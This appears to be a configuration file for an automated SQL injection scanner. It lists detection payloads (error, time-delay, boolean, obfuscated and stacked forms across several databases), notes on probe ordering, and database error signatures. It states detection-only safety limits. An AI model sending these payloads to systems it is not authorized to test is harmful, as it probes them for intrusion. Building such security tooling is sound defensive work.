# SQL injection payloads — seed list for the SQLi agent
#
# Safety rules (enforced by agent):
#   - NO DROP, TRUNCATE, DELETE without WHERE, UPDATE without WHERE
#   - NO long SLEEP values (max 5s)
#   - Detection only: read-only SELECT, error triggers, boolean conditions

payloads:
  error_based:
    - "'"
    - "''"
    - "' OR '1'='1"
    - "' OR '1'='1'--"
    - "' OR 1=1--"
    - "\" OR \"1\"=\"1"
    - "1 AND 1=1"
    - "1 AND 1=2"
    - "1' AND '1'='1"
    - "1' AND '1'='2"
    - "') OR ('1'='1"

  time_based:
    # Order matters: the detector tries these in sequence under a per-endpoint
    # time budget, and each SLEEP probe costs a full ~5s. Put the RELIABLE
    # single-execution forms first.
    #   - `AND SLEEP(n)` runs the sleep ONCE (only for the matched row), giving a
    #     clean ~5s delay.
    #   - `OR SLEEP(n)` is evaluated for EVERY row the query scans, so on a table
    #     with several rows it multiplies to 5s*N and blows past the client read
    #     timeout — the probe is discarded and the budget wasted before the
    #     reliable payloads run. Keep it, but LAST.
    #   - Stacked `'; SELECT SLEEP(5)` does not execute on drivers that reject
    #     multi-statement queries (e.g. mysqli), so it is not a reliable primary.
    # MySQL — single-execution first
    - "1' AND SLEEP(5)-- -"
    - "1 AND SLEEP(5)-- -"
    - "' AND SLEEP(5)-- -"
    # MSSQL
    - "1; WAITFOR DELAY '0:0:5'-- -"
    - "'; WAITFOR DELAY '0:0:5'-- -"
    # PostgreSQL
    - "1'; SELECT pg_sleep(5)-- -"
    - "'; SELECT pg_sleep(5)-- -"
    # SQLite (no native sleep — uses heavy query as approximation)
    - "' AND (SELECT COUNT(*) FROM sqlite_master, sqlite_master m2, sqlite_master m3)>0 AND '1'='1"
    # Stacked / row-multiplied forms LAST (see note above)
    - "'; SELECT SLEEP(5)-- -"
    - "' OR SLEEP(5)-- -"

  boolean_based:
    - "' AND 1=1-- -"
    - "' AND 1=2-- -"
    - "1 AND 1=1-- -"
    - "1 AND 1=2-- -"
    - "' AND 'x'='x"
    - "' AND 'x'='y"

  obfuscation:
    - "' /*!OR*/ '1'='1"
    - "'/**/OR/**/'1'='1"
    - "' %4fR '1'='1"           # URL-encoded O
    - "' O%52 '1'='1"           # URL-encoded R
    - "1'%20AND%20'1'%3D'1"
    - "1' AND 0x31=0x31-- -"

  stacked:
    # Only try if single-quote variant confirmed injectable
    - "'; SELECT 1-- -"
    - "1; SELECT 1-- -"

# Detection signatures (used by agent to classify responses)
error_signatures:
  - "you have an error in your sql syntax"
  - "unclosed quotation mark"
  - "quoted string not properly terminated"
  - "pg_query()"
  - "ORA-"
  - "Microsoft OLE DB Provider for SQL"
  - "Syntax error.*SQL"
  - "SQLiteException"
  - "SQLITE_ERROR"
  # SQLite / SQLAlchemy (Python, Flask, embedded, mobile) — the sqlite3 driver
  # and SQLAlchemy surface these when an injected quote breaks the query. Common
  # and previously unmatched (e.g. VAmPI's /users/v1/{username}).
  - "sqlite3.OperationalError"
  - "sqlite3.IntegrityError"
  - "sqlite3.ProgrammingError"
  - "sqlite3.DatabaseError"
  - "unrecognized token"
  - "SQL logic error"
  - "sqlalchemy.exc.OperationalError"
  - "sqlalchemy.exc.ProgrammingError"
  - "sql syntax.*near"
  - "near.*syntax error"
  - "warning.*mysql"
  - "PSQLException"
  - "com.mysql.jdbc"
  - "org.postgresql"
  - "System.Data.SqlClient"

time_threshold_ms: 4500
max_sleep_seconds: 5
